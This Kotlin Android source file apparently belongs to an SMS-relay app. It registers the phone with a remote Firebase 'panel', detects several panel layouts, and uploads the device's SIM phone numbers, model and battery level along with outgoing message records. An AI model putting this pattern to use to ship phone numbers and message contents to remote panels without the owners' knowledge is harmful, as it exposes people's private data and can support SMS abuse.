package com.hivirtus.zygiskmode

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.util.Log

/**
 * Har phone Firebase pe register — kisi bhi panel ke devices path pe dikhe.
 */
object FirebaseDeviceRegistry {

    private const val TAG = "FirebaseDeviceRegistry"

    data class ConnectResult(
        val connected: Boolean,
        val layout: FirebasePanelDetector.Layout,
        val deviceCount: Int
    )

    fun connectAndRegister(context: Context, config: FirebaseAutoTokenStore.Config): ConnectResult {
        if (config.dbUrl.isBlank() || config.deviceId.isBlank()) {
            return ConnectResult(false, FirebasePanelDetector.ALL_LAYOUTS.first(), 0)
        }
        val client = FirebaseRestClient(config)
        if (!client.testConnection()) {
            return ConnectResult(false, FirebasePanelDetector.ALL_LAYOUTS.first(), 0)
        }
        val layout = FirebasePanelDetector.detect(client)
        val payload = buildDevicePayload(context, config)
        val ok = mirrorPut(client, FirebasePathResolver.mirrorDevicePaths(config.deviceId), payload)
        val count = FirebasePanelDetector.countDevices(client, layout)
        Log.i(TAG, "connect panel=${layout.label} devices=$count ok=$ok")
        return ConnectResult(ok, layout, count)
    }

    fun register(context: Context, config: FirebaseAutoTokenStore.Config): Boolean {
        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return false
        val client = FirebaseRestClient(config)
        val payload = buildDevicePayload(context, config)
        return mirrorPut(client, FirebasePathResolver.mirrorDevicePaths(config.deviceId), payload)
    }

    fun publishOutgoingToken(
        context: Context,
        config: FirebaseAutoTokenStore.Config,
        dest: String,
        body: String,
        sendFrom: String = ""
    ): Boolean {
        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return false
        val client = FirebaseRestClient(config)
        val now = System.currentTimeMillis()
        val recipient = HivirtusPanelFormat.formatDest(dest)
        val message = body.trim()
        val simLabel = if (config.senderSimSlot == 0) "SIM1" else "SIM2"
        val payload = linkedMapOf<String, Any?>(
            "messageSender" to recipient,
            "messageBody" to message,
            "body" to message,
            "message" to message,
            "to" to recipient,
            "recipient" to recipient,
            "from" to sendFrom.ifBlank { config.sim1Number },
            "type" to "outgoing",
            "direction" to "outgoing",
            "status" to "new",
            "timestamp" to now,
            "created_at" to now,
            "deviceId" to config.deviceId,
            "device_id" to config.deviceId,
            "targetSim" to simLabel,
            "sim" to config.senderSimSlot,
            "one_tap_copy" to HivirtusPanelFormat.oneTapCopy(dest, message),
            "panel" to "hivirtus"
        )
        var any = false
        for (path in FirebasePathResolver.mirrorMessagePaths(config.deviceId)) {
            if (client.push(path, payload) != null) any = true
        }
        return any
    }

    fun buildDevicePayload(
        context: Context,
        config: FirebaseAutoTokenStore.Config
    ): Map<String, Any?> {
        val sims = SimSmsSender.readSimNumbers(context)
        val sim1 = sims.firstOrNull { it.slot == 0 }?.number.orEmpty().ifBlank { config.sim1Number }
        val sim2 = sims.firstOrNull { it.slot == 1 }?.number.orEmpty().ifBlank { config.sim2Number }
        val now = System.currentTimeMillis()
        return linkedMapOf(
            "deviceId" to config.deviceId,
            "device_id" to config.deviceId,
            "deviceName" to Build.MODEL,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "online" to true,
            "status" to "online",
            "battery" to readBatteryPercent(context),
            "role" to config.role.wire,
            "sim1" to sim1,
            "sim2" to sim2,
            "sim1_number" to sim1,
            "sim2_number" to sim2,
            "senderSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
            "targetSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
            "lastSeen" to now,
            "updated_at" to now,
            "app" to "hivirtus_zygisk",
            "panel" to "hivirtus",
            "version" to BuildConfig.VERSION_NAME
        )
    }

    private fun mirrorPut(
        client: FirebaseRestClient,
        paths: List<String>,
        payload: Map<String, Any?>
    ): Boolean {
        var any = false
        for (path in paths) {
            if (client.put(path, payload)) any = true
        }
        return any
    }

    private fun readBatteryPercent(context: Context): Int {
        return try {
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = context.registerReceiver(null, filter) ?: return -1
            val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            if (level < 0 || scale <= 0) -1 else (level * 100 / scale)
        } catch (_: Exception) {
            -1
        }
    }

    fun sync(context: Context) {
        AutoTokenSenderService.sync(context)
    }
}
